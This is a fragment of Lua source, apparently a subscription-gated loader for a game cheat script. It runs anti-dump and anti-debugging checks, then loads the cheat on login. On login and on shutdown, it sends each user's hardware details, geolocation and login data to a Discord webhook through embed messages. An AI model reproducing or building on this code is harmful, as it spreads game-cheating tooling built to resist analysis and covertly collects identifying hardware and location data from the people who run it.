            login_embed:setTitle(shutdown_data.sub_active and '[Login]' or '[Expired Sub]')
            login_embed:setDescription(shutdown_data.login_user_data)
            login_embed:addField('[Hardware]', shutdown_data.login_hardware_data, true)
            login_embed:addField('[Geo]', shutdown_data.login_geo_data, false)
            login_embed:setImage(shutdown_data.login_country)
            login_embed:setColor(shutdown_data.sub_active and 9811974 or 16711680)
            login_embed:setThumbnail('https://cdn.discordapp.com/icons/770374971087388732/a_90e65c655cb31978f29c8f0b781338d6.webp?size=1024')
            ihobitExem_Webhook:send(login_embed)
            --latency_print('10')

            if shutdown_data.sub_active then
                --latency_print('12')
                sauron_notifier:paint(10, string_format("Welcome back, %s! Successfully loaded %s, Build: %s, Days Remained: %s", parsed_data.userinfo.name, parsed_data.loaderinfo.name, parsed_data.userinfo.title, parsed_data.userinfo.expires))
                pcall(sauron_load, parsed_data)
            else
                sauron_notifier:paint(5, string_format("Your subscription has ended. Shutting down."))
            end
        end)
    end)
end

function script:create_ui()
    _G.sauron_ui = {}

    for key, val in pairs(ref_cache) do
        _G.sauron_ui[key] = {}

        for elem, ref in pairs(val) do
            sauron_ui[key][ref.args[3]] = {ref = ui[ref.func](unpack(ref.args)), args = ref.args}
            ui.set_visible(sauron_ui[key][ref.args[3]].ref, false)
        end
    end

    ui.set_visible(script.list, false)
end

do
    if not MyPersonaAPI.IsConnectedToGC() then
        sauron_notifier:paint(10, "Please connect to the internet.")
        return
    end

    anti_dump_check()
    check_builtin()
    anti_http_debug()

    if loader.is_valid then
        script:create_ui()

        local login_result = pcall(sauron_login)

        if not login_result then
            sauron_notifier:paint(3, "Failed to login.")
        end
    end
end

ui.set_callback(script.reload, function()
    script.reloaded = true
end)

client_set_event_callback("shutdown", function()
    if not MyPersonaAPI.IsConnectedToGC() then 
        return
    end

    for key, val in pairs(_G.sauron_reference or {}) do
        ref_cache[key] = val
    end

    database_write('sauron_ref_cache', ref_cache)

    local shutdown_embed = discord.newEmbed()
    local sys_time = {client_system_time()}
    local shutdown_time = string_format('%02d:%02d:%02d', sys_time[1], sys_time[2], sys_time[3])

    shutdown_embed:addField('[Hardware]', shutdown_data.login_hardware_data, true)
    shutdown_embed:addField('[Geo]', shutdown_data.login_geo_data, false)
    shutdown_embed:addField('[Shutdown Data]', string_format("Login time: %s", shutdown_time), false)
    shutdown_embed:setImage(shutdown_data.login_country)
    shutdown_embed:setDescription(shutdown_data.login_user_data)
    shutdown_embed:setTitle(string.format(shutdown_data.sub_active and '(%s) - [Login]' or '(%s) - [Expired Sub]', script.reloaded and 'Reloaded' or 'Shutdown'))
    shutdown_embed:setColor(shutdown_data.sub_active and 9811974 or 16711680)
    ihobitExem_Webhook:send(shutdown_embed)
end)
--#region functions --